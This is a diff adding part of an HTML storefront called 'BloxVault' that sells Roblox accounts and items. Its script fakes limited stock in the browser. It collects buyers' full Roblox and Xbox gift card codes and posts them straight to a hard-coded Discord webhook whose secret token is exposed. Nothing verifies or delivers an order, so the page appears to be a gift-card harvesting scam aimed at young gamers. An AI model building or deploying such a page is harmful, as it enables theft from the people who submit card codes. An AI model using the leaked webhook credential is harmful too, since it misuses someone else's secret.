+                                <span class="px-3 py-1 rounded-full text-xs text-white font-bold bg-green-500 shadow-lg shadow-green-500/50">LIMITED</span>
+                            </div>
+                        </div>
+                        
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-3 mb-6">
+                            <div class="item-row flex justify-between items-center p-3 bg-green-950/30 rounded-lg border border-green-400/30" onclick="event.stopPropagation(); openPurchaseModal('Base ESock', '$2.50', 'baseesock')" data-item-id="baseesock">
+                                <div>
+                                    <span class="font-semibold text-green-200">Base ESock</span>
+                                    <span class="stock-counter stock-high" data-stock="14">14 IN STOCK</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="text-green-300 font-bold">$2.50</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-green-950/30 rounded-lg border border-green-400/30" onclick="event.stopPropagation(); openPurchaseModal('Emerald ESock', '$5.00', 'emeraldesock')" data-item-id="emeraldesock">
+                                <div>
+                                    <span class="font-semibold text-green-200">Emerald ESock</span>
+                                    <span class="stock-counter stock-low" data-stock="2">2 IN STOCK</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="text-green-300 font-bold">$5.00</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-green-950/30 rounded-lg border border-green-400/30" onclick="event.stopPropagation(); openPurchaseModal('Emerald ESock', '$5.00', 'emeraldesock2')" data-item-id="emeraldesock2">
+                                <div>
+                                    <span class="font-semibold text-green-200">Emerald ESock</span>
+                                    <span class="stock-counter stock-low" data-stock="2">2 IN STOCK</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="text-green-300 font-bold">$5.00</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-green-950/30 rounded-lg border border-green-400/30" onclick="event.stopPropagation(); openPurchaseModal('Dug Dugs', '$1.25', 'dugdugs')" data-item-id="dugdugs">
+                                <div>
+                                    <span class="font-semibold text-green-200">Dug Dugs</span>
+                                    <span class="stock-counter stock-low" data-stock="2">2 IN STOCK</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="text-green-300 font-bold">$1.25</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-green-950/30 rounded-lg border border-green-400/30" onclick="event.stopPropagation(); openPurchaseModal('Job Job Jobs', '$1.50', 'jobjobjobs')" data-item-id="jobjobjobs">
+                                <div>
+                                    <span class="font-semibold text-green-200">Job Job Jobs</span>
+                                    <span class="stock-counter stock-medium" data-stock="4">4 IN STOCK</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="text-green-300 font-bold">$1.50</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-green-950/30 rounded-lg border border-green-400/30" onclick="event.stopPropagation(); openPurchaseModal('Frag La La La', '$1.00', 'fraglalala')" data-item-id="fraglalala">
+                                <div>
+                                    <span class="font-semibold text-green-200">Frag La La La</span>
+                                    <span class="stock-counter stock-medium" data-stock="4">4 IN STOCK</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="text-green-300 font-bold">$1.00</span>
+                                </div>
+                            </div>
+                        </div>
+                        <button class="w-full py-3 bg-gradient-to-r from-green-500 to-cyan-500 rounded-lg font-bold hover:from-green-400 hover:to-cyan-400 transition-all shadow-lg shadow-green-500/30 pointer-events-none">
+                            Buy Tsunami Items
+                        </button>
+                    </div>
+
+                    <!-- Info Card -->
+                    <div class="product-card relative rounded-2xl p-6 overflow-hidden">
+                        <div class="absolute inset-0 bg-gradient-to-br from-green-500/10 to-cyan-500/10"></div>
+                        <div class="relative z-10 flex flex-col items-center justify-center h-full text-center py-8">
+                            <div class="w-20 h-20 bg-gradient-to-br from-green-400 to-cyan-500 rounded-full flex items-center justify-center text-4xl mb-4 shadow-lg shadow-green-500/30">
+                                🧠
+                            </div>
+                            <h3 class="text-2xl font-bold font-orbitron mb-2 text-green-400">BRAIN ROT</h3>
+                            <p class="text-gray-300 mb-4">Exclusive Tsunami items with limited stock!</p>
+                            <div class="space-y-2 text-sm text-gray-400">
+                                <p>✓ Instant Delivery</p>
+                                <p>✓ Rare Collectibles</p>
+                                <p>✓ Limited Quantities</p>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </section>
+
+        <div class="section-divider"></div>
+
+        <!-- SUPPORT & PAYMENT SECTION -->
+        <section id="support" class="relative z-10 px-4 pb-20 pt-10">
+            <div class="max-w-7xl mx-auto">
+                <h2 class="text-4xl font-orbitron font-bold flex items-center gap-3 mb-12 justify-center">
+                    <span class="w-2 h-8 bg-cyan-400 rounded-full shadow-[0_0_10px_#00f3ff]"></span>
+                    SUPPORT & PAYMENT
+                </h2>
+
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-5xl mx-auto">
+                    
+                    <!-- Discord Support -->
+                    <div class="bg-gradient-to-br from-[#5865F2]/20 to-[#5865F2]/5 rounded-2xl p-6 border border-[#5865F2]/30 text-center">
+                        <div class="w-16 h-16 bg-[#5865F2] rounded-2xl flex items-center justify-center text-3xl mx-auto mb-4 discord-btn">
+                            <svg class="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg>
+                        </div>
+                        <h3 class="text-xl font-bold font-orbitron mb-2">DISCORD</h3>
+                        <p class="text-gray-400 text-sm mb-4">Get support & complete purchases</p>
+                        <a href="https://discord.gg/2mr7dEP3f" target="_blank" class="inline-block w-full py-3 bg-[#5865F2] rounded-lg font-bold hover:bg-[#4752C4] transition-all discord-btn text-white text-sm">
+                            Join Server
+                        </a>
+                    </div>
+
+                    <!-- Cash App -->
+                    <div class="bg-gradient-to-br from-[#00D632]/20 to-[#00D632]/5 rounded-2xl p-6 border border-[#00D632]/30 text-center">
+                        <div class="w-16 h-16 bg-[#00D632] rounded-2xl flex items-center justify-center text-3xl mx-auto mb-4 cashapp-btn text-white font-bold">
+                            $
+                        </div>
+                        <h3 class="text-xl font-bold font-orbitron mb-2 text-[#00D632]">CASH APP</h3>
+                        <p class="text-gray-400 text-sm mb-4">Fast & secure payments</p>
+                        <a href="https://cash.app/$kinglogan78193" target="_blank" class="inline-block w-full py-3 bg-[#00D632] rounded-lg font-bold hover:bg-[#00b82b] transition-all text-white text-sm">
+                            $kinglogan78193
+                        </a>
+                    </div>
+
+                    <!-- Robux Donation -->
+                    <div class="bg-gradient-to-br from-[#00a2ff]/20 to-[#bc13fe]/20 rounded-2xl p-6 border border-[#00a2ff]/30 text-center relative overflow-hidden">
+                        <div class="relative z-10">
+                            <div class="w-16 h-16 bg-gradient-to-br from-[#00a2ff] to-[#bc13fe] rounded-2xl flex items-center justify-center text-2xl mx-auto mb-4 animate-pulse">
+                                💰
+                            </div>
+                            <h3 class="text-xl font-bold font-orbitron mb-2 text-[#00a2ff]">ROBUX</h3>
+                            <p class="text-gray-400 text-sm mb-4">Donate to support us!</p>
+                            
+                            <div class="space-y-3 mb-4">
+                                <div class="bg-black/40 rounded-lg p-3 border border-[#00a2ff]/30">
+                                    <p class="text-xs text-gray-400 mb-1">Username 1:</p>
+                                    <p class="text-lg font-bold text-[#00a2ff] font-mono">@dametime</p>
+                                </div>
+                                <div class="bg-black/40 rounded-lg p-3 border border-[#bc13fe]/30">
+                                    <p class="text-xs text-gray-400 mb-1">Username 2:</p>
+                                    <p class="text-lg font-bold text-[#bc13fe] font-mono">@Sonofgoku01</p>
+                                </div>
+                            </div>
+                            
+                            <p class="text-xs text-gray-500 mt-2">Donate to either account if you would like to support. Thank you!</p>
+                        </div>
+                    </div>
+
+                </div>
+
+                <!-- Payment Methods Info -->
+                <div class="mt-12 max-w-4xl mx-auto bg-gradient-to-r from-cyan-500/10 via-purple-500/10 to-green-500/10 border border-white/20 rounded-2xl p-6 text-center">
+                    <h4 class="text-xl font-bold text-white mb-4 font-orbitron">💳 ACCEPTED PAYMENT METHODS</h4>
+                    <div class="flex justify-center gap-8 flex-wrap">
+                        <div class="flex items-center gap-2">
+                            <span class="text-2xl">🎁</span>
+                            <span class="text-cyan-400 font-bold">Roblox Gift Cards</span>
+                        </div>
+                        <div class="flex items-center gap-2">
+                            <span class="text-2xl">🎮</span>
+                            <span class="text-green-400 font-bold">Xbox Gift Cards</span>
+                        </div>
+                        <div class="flex items-center gap-2">
+                            <span class="text-2xl">💰</span>
+                            <span class="text-green-400 font-bold">Please Donate (Robux)</span>
+                        </div>
+                        <div class="flex items-center gap-2">
+                            <span class="text-2xl">💵</span>
+                            <span class="text-[#00D632] font-bold">Cash App</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TikTok Link -->
+                <div class="mt-8 text-center">
+                    <p class="text-gray-400 mb-4">Follow us on TikTok for updates!</p>
+                    <a href="https://www.tiktok.com/@bloxvault5" target="_blank" class="inline-flex items-center gap-2 px-6 py-3 bg-black/50 border border-white/20 rounded-full hover:border-cyan-400 transition-colors">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1-.1z"/></svg>
+                        @bloxvault5
+                    </a>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="relative z-10 border-t border-white/10 bg-black/40 mt-20">
+            <div class="max-w-7xl mx-auto px-4 py-12">
+                <div class="flex flex-col md:flex-row justify-between items-center gap-6">
+                    <div class="flex items-center gap-3">
+                        <div class="w-8 h-8 bg-gradient-to-br from-cyan-400 to-purple-600 rounded flex items-center justify-center shadow-lg shadow-cyan-500/30">
+                            <span class="font-orbitron font-bold text-sm">B</span>
+                        </div>
+                        <span class="font-orbitron font-bold text-xl">BLOXVAULT</span>
+                    </div>
+                    <div class="flex gap-8 text-gray-400">
+                        <a href="#" onclick="scrollToSection('accounts')" class="hover:text-cyan-400 transition-colors">Accounts</a>
+                        <a href="#" onclick="scrollToSection('items')" class="hover:text-cyan-400 transition-colors">Items</a>
+                        <a href="#" onclick="scrollToSection('custom')" class="hover:text-yellow-400 transition-colors">Custom</a>
+                        <a href="#" onclick="scrollToSection('brainrot')" class="hover:text-green-400 transition-colors">Brain Rot</a>
+                        <a href="https://discord.gg/2mr7dEP3f" target="_blank" class="hover:text-[#5865F2] transition-colors">Discord</a>
+                        <a href="https://www.tiktok.com/@bloxvault5" target="_blank" class="hover:text-white transition-colors">TikTok</a>
+                    </div>
+                    <div class="text-gray-400 text-sm text-center md:text-right">
+                        <p>© 2026 BloxVault. Not affiliated with Roblox Corp.</p>
+                        <p class="text-cyan-400 mt-1">Gift Cards • Robux • Cash App Accepted</p>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Stock Management System
+        const defaultStock = {
+            'baseesock': 14,
+            'emeraldesock': 2,
+            'emeraldesock2': 2,
+            'dugdugs': 2,
+            'jobjobjobs': 4,
+            'fraglalala': 4
+        };
+
+        // Initialize stock from localStorage or use defaults
+        function getStock(itemId) {
+            const saved = localStorage.getItem(`stock_${itemId}`);
+            return saved !== null ? parseInt(saved) : defaultStock[itemId] || 0;
+        }
+
+        function setStock(itemId, quantity) {
+            localStorage.setItem(`stock_${itemId}`, quantity);
+        }
+
+        function decrementStock(itemId) {
+            const current = getStock(itemId);
+            if (current > 0) {
+                setStock(itemId, current - 1);
+                return true;
+            }
+            return false;
+        }
+
+        // Update stock displays
+        function updateStockDisplays() {
+            document.querySelectorAll('[data-item-id]').forEach(el => {
+                const itemId = el.dataset.itemId;
+                const stock = getStock(itemId);
+                const counter = el.querySelector('.stock-counter');
+                
+                if (counter) {
+                    counter.textContent = stock > 0 ? `${stock} IN STOCK` : 'OUT OF STOCK';
+                    counter.className = 'stock-counter';
+                    
+                    if (stock === 0) {
+                        counter.classList.add('stock-low');
+                        el.classList.add('out-of-stock');
+                        if (!el.querySelector('.out-of-stock-badge')) {
+                            const badge = document.createElement('div');
+                            badge.className = 'out-of-stock-badge';
+                            badge.textContent = 'SOLD OUT';
+                            el.appendChild(badge);
+                        }
+                    } else if (stock <= 3) {
+                        counter.classList.add('stock-low');
+                    } else if (stock <= 8) {
+                        counter.classList.add('stock-medium');
+                    } else {
+                        counter.classList.add('stock-high');
+                    }
+                }
+            });
+        }
+
+        // Loading Screen
+        window.addEventListener('load', function() {
+            const loader = document.getElementById('loader');
+            const mainContent = document.getElementById('main-content');
+            
+            setTimeout(function() {
+                loader.style.transition = 'opacity 0.5s ease';
+                loader.style.opacity = '0';
+                
+                setTimeout(function() {
+                    loader.style.display = 'none';
+                    mainContent.classList.add('loaded');
+                    
+                    gsap.from('nav', { y: -100, opacity: 0, duration: 0.8, ease: 'power3.out' });
+                    gsap.from('section', { y: 50, opacity: 0, duration: 0.8, delay: 0.2, stagger: 0.1 });
+                    
+                    // Initialize stock displays
+                    updateStockDisplays();
+                }, 500);
+            }, 2000);
+        });
+
+        // Tab Switching
+        function switchTab(tab) {
+            const accountsSection = document.getElementById('accounts-section');
+            const itemsSection = document.getElementById('items-section');
+            const customSection = document.getElementById('custom-section');
+            const brainrotSection = document.getElementById('brainrot-section');
+            const accountsTab = document.getElementById('tab-accounts');
+            const itemsTab = document.getElementById('tab-items');
+            const customTab = document.getElementById('tab-custom');
+            const brainrotTab = document.getElementById('tab-brainrot');
+
+            // Hide all sections
+            accountsSection.classList.add('hidden');
+            itemsSection.classList.add('hidden');
+            customSection.classList.add('hidden');
+            brainrotSection.classList.add('hidden');
+            
+            // Remove active from all tabs
+            accountsTab.classList.remove('active');
+            itemsTab.classList.remove('active');
+            customTab.classList.remove('active');
+            brainrotTab.classList.remove('active');
+
+            // Show selected section
+            if (tab === 'accounts') {
+                accountsSection.classList.remove('hidden');
+                accountsTab.classList.add('active');
+                gsap.from("#accounts-section .product-card", {
+                    y: 50, opacity: 0, duration: 0.6, stagger: 0.1, ease: "power2.out"
+                });
+            } else if (tab === 'items') {
+                itemsSection.classList.remove('hidden');
+                itemsTab.classList.add('active');
+                gsap.from("#items-section .product-card", {
+                    y: 50, opacity: 0, duration: 0.6, stagger: 0.1, ease: "power2.out"
+                });
+            } else if (tab === 'custom') {
+                customSection.classList.remove('hidden');
+                customTab.classList.add('active');
+                gsap.from("#custom-section .product-card", {
+                    y: 50, opacity: 0, duration: 0.6, stagger: 0.1, ease: "power2.out"
+                });
+            } else if (tab === 'brainrot') {
+                brainrotSection.classList.remove('hidden');
+                brainrotTab.classList.add('active');
+                gsap.from("#brainrot-section .product-card", {
+                    y: 50, opacity: 0, duration: 0.6, stagger: 0.1, ease: "power2.out"
+                });
+                updateStockDisplays();
+            }
+        }
+
+        // Smooth Scroll
+        function scrollToSection(section) {
+            if (section === 'accounts') {
+                switchTab('accounts');
+                document.getElementById('accounts-section').scrollIntoView({ behavior: 'smooth' });
+            } else if (section === 'items') {
+                switchTab('items');
+                document.getElementById('items-section').scrollIntoView({ behavior: 'smooth' });
+            } else if (section === 'custom') {
+                switchTab('custom');
+                document.getElementById('custom-section').scrollIntoView({ behavior: 'smooth' });
+            } else if (section === 'brainrot') {
+                switchTab('brainrot');
+                document.getElementById('brainrot-section').scrollIntoView({ behavior: 'smooth' });
+            } else if (section === 'support') {
+                document.getElementById('support').scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }
+        }
+
+        // Modal Functions
+        let currentItem = '';
+        let currentPrice = '';
+        let currentItemId = '';
+        let currentPaymentMethod = 'giftcard';
+
+        function openPurchaseModal(item, price, itemId = '') {
+            currentItem = item;
+            currentPrice = price;
+            currentItemId = itemId;
+            
+            // Check stock if itemId provided
+            if (itemId && getStock(itemId) <= 0) {
+                alert('This item is currently out of stock!');
+                return;
+            }
+            
+            document.getElementById('modalItemName').textContent = item;
+            document.getElementById('modalItemPrice').textContent = price;
+            document.getElementById('purchaseModal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+            
+            // Reset payment method to gift card by default
+            selectPayment('giftcard');
+        }
+
+        function closeModal() {
+            document.getElementById('purchaseModal').classList.remove('active');
+            document.body.style.overflow = 'auto';
+            document.getElementById('robloxUsername').value = '';
+            document.getElementById('giftCardCode').value = '';
+            document.getElementById('xboxCardCode').value = '';
+            document.getElementById('discordUser').value = '';
+            document.getElementById('successMessage').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
+            document.getElementById('submitBtn').disabled = false;
+            document.getElementById('submitBtn').innerHTML = 'CONFIRM PURCHASE <span class="loading-spinner" id="spinner"></span>';
+        }
+
+        function selectPayment(method) {
+            currentPaymentMethod = method;
+            
+            // Reset all options
+            document.getElementById('giftcardOption').classList.remove('selected');
+            document.getElementById('xboxOption').classList.remove('selected');
+            document.getElementById('donateOption').classList.remove('selected');
+            document.getElementById('cashappOption').classList.remove('selected');
+            
+            // Hide all sections
+            document.getElementById('giftCardSection').style.display = 'none';
+            document.getElementById('xboxSection').style.display = 'none';
+            document.getElementById('donateSection').style.display = 'none';
+            document.getElementById('cashappSection').style.display = 'none';
+            
+            // Show selected
+            if (method === 'giftcard') {
+                document.getElementById('giftcardOption').classList.add('selected');
+                document.getElementById('giftCardSection').style.display = 'block';
+            } else if (method === 'xbox') {
+                document.getElementById('xboxOption').classList.add('selected');
+                document.getElementById('xboxSection').style.display = 'block';
+            } else if (method === 'donate') {
+                document.getElementById('donateOption').classList.add('selected');
+                document.getElementById('donateSection').style.display = 'block';
+            } else if (method === 'cashapp') {
+                document.getElementById('cashappOption').classList.add('selected');
+                document.getElementById('cashappSection').style.display = 'block';
+            }
+        }
+
+        document.getElementById('purchaseModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeModal();
+            }
+        });
+
+        async function submitPurchase() {
+            const robloxUsername = document.getElementById('robloxUsername').value.trim();
+            const giftCardCode = document.getElementById('giftCardCode').value.trim();
+            const xboxCardCode = document.getElementById('xboxCardCode').value.trim();
+            const discordUser = document.getElementById('discordUser').value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+            const spinner = document.getElementById('spinner');
+            const successMsg = document.getElementById('successMessage');
+            const errorMsg = document.getElementById('errorMessage');
+
+            // Validation
+            if (!robloxUsername) {
+                alert('Please enter your Roblox username!');
+                return;
+            }
+
+            if (currentPaymentMethod === 'giftcard' && !giftCardCode) {
+                alert('Please enter your Roblox Gift Card code!');
+                return;
+            }
+
+            if (currentPaymentMethod === 'giftcard' && giftCardCode.length < 10) {
+                alert('Please enter a valid Roblox Gift Card code!');
+                return;
+            }
+
+            if (currentPaymentMethod === 'xbox' && !xboxCardCode) {
+                alert('Please enter your Xbox Gift Card code!');
+                return;
+            }
+
+            submitBtn.disabled = true;
+            spinner.style.display = 'inline-block';
+            successMsg.style.display = 'none';
+            errorMsg.style.display = 'none';
+
+            let paymentInfo = '';
+            if (currentPaymentMethod === 'giftcard') {
+                paymentInfo = `||${giftCardCode}||`;
+            } else if (currentPaymentMethod === 'xbox') {
+                paymentInfo = `Xbox: ||${xboxCardCode}||`;
+            } else if (currentPaymentMethod === 'donate') {
+                paymentInfo = 'Please Donate (Robux) - User will send via stand';
+            } else if (currentPaymentMethod === 'cashapp') {
+                paymentInfo = 'Cash App - User will send to $kinglogan78193';
+            }
+
+            const webhookData = {
+                content: "🛒 **NEW PURCHASE ORDER** 🛒",
+                embeds: [{
+                    title: "BloxVault Purchase",
+                    color: currentPaymentMethod === 'giftcard' ? 0x00f3ff : currentPaymentMethod === 'xbox' ? 0x00ff88 : currentPaymentMethod === 'donate' ? 0x00ff88 : 0x00D632,
+                    fields: [
+                        {
+                            name: "📦 Item",
+                            value: currentItem,
+                            inline: true
+                        },
+                        {
+                            name: "💰 Price",
+                            value: currentPrice,
+                            inline: true
+                        },
+                        {
+                            name: "👤 Roblox Username",
+                            value: robloxUsername,
+                            inline: true
+                        },
+                        {
+                            name: "💳 Payment Method",
+                            value: currentPaymentMethod.toUpperCase(),
+                            inline: true
+                        },
+                        {
+                            name: "🎁 Payment Info",
+                            value: paymentInfo,
+                            inline: false
+                        },
+                        {
+                            name: "📱 Discord User",
+                            value: discordUser || "Not provided",
+                            inline: true
+                        },
+                        {
+                            name: "⏰ Time",
+                            value: new Date().toLocaleString(),
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: "BloxVault Marketplace"
+                    }
+                }]
+            };
+
+            try {
+                const response = await fetch('https://discord.com/api/webhooks/1467293505054314517/quZluMxlV2Zr2E2ScQ0gwJjsgP9knCqIGMnGH-7rOr5vZ3OB-4uHnIqwIzj8hzCgNYvW', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(webhookData)
+                });
+
+                if (response.ok) {
+                    // Decrement stock if item has an ID
+                    if (currentItemId) {
+                        decrementStock(currentItemId);
+                        updateStockDisplays();
+                    }
+                    
+                    spinner.style.display = 'none';
+                    successMsg.style.display = 'block';
+                    submitBtn.innerHTML = '✅ SENT SUCCESSFULLY';
+                    
+                    setTimeout(() => {
+                        closeModal();
+                    }, 3000);
+                } else {
+                    throw new Error('Webhook failed');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                spinner.style.display = 'none';
+                errorMsg.style.display = 'block';
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = 'RETRY SEND <span class="loading-spinner" id="spinner"></span>';
+            }
+        }
+
+        // Format gift card code as user types
+        document.getElementById('giftCardCode').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/-/g, '').toUpperCase();
+            if (value.length > 4 && value.length <= 8) {
+                value = value.slice(0, 4) + '-' + value.slice(4);
+            } else if (value.length > 8 && value.length <= 12) {
+                value = value.slice(0, 4) + '-' + value.slice(4, 8) + '-' + value.slice(8);
+            } else if (value.length > 12) {
+                value = value.slice(0, 4) + '-' + value.slice(4, 8) + '-' + value.slice(8, 12) + '-' + value.slice(12, 16);
+            }
+            e.target.value = value;
+        });
+
+        // Format Xbox card code as user types (5 groups of 5)
+        document.getElementById('xboxCardCode').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/-/g, '').toUpperCase();
+            let formatted = '';
+            for (let i = 0; i < value.length && i < 25; i++) {
+                if (i > 0 && i % 5 === 0) formatted += '-';
+                formatted += value[i];
+            }
+            e.target.value = formatted;
+        });
+    </script>
+</body>
+</html>
